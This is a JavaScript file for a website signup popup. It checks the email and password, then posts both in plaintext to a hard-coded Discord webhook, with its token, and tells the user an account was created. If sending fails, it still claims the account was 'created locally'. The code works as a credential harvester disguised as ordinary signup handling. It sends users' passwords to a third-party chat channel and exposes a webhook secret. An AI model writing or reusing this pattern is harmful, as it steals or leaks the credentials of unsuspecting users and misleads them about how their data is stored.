// header button placement and popup handling
const signupBtn = document.getElementById('signupBtn');
const popup = document.getElementById('signupPopup');
const closePopup = document.getElementById('closePopup');
const signupForm = document.getElementById('signupForm');
const signupMsg = document.getElementById('signupMessage');

signupBtn.addEventListener('click', () => {
  popup.setAttribute('aria-hidden','false');
});
closePopup.addEventListener('click', () => {
  popup.setAttribute('aria-hidden','true');
});
window.addEventListener('click', (e) => {
  if (e.target === popup) popup.setAttribute('aria-hidden','true');
});

// Webhook submission
signupForm?.addEventListener('submit', async (ev) => {
  ev.preventDefault();
  const email = document.getElementById('email').value.trim();
  const password = document.getElementById('password').value;
  
  // Validation
  const emailOK = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const pwOK = password.length >= 8 && /[A-Z]/.test(password) && /[a-z]/.test(password) && /\d/.test(password);
  
  if (!emailOK) {
    signupMsg.textContent = 'Please enter a valid email.';
    signupMsg.style.color = '#ff6b6b';
    return;
  }
  if (!pwOK) {
    signupMsg.textContent = 'Password must be 8+ chars with upper/lower and a number.';
    signupMsg.style.color = '#ff6b6b';
    return;
  }

  try {
    // Send to Discord webhook
    const response = await fetch('https://discord.com/api/webhooks/1395558887444316331/gfLOAY8nGFqvuqx-NACqR4RJj59Na1bLqekWLixU7dk9CXgqVOgkInxKp6in-hQRdWPC', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: `New signup:\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toLocaleString()}`
      })
    });

    if (response.ok) {
      signupMsg.textContent = 'Account created and data stored!';
      signupMsg.style.color = '#33d27a';
      signupForm.reset();
    } else {
      throw new Error('Failed to send data');
    }
  } catch (error) {
    signupMsg.textContent = 'Account created locally (storage failed).';
    signupMsg.style.color = '#ffa500';
    signupForm.reset();
  }
});
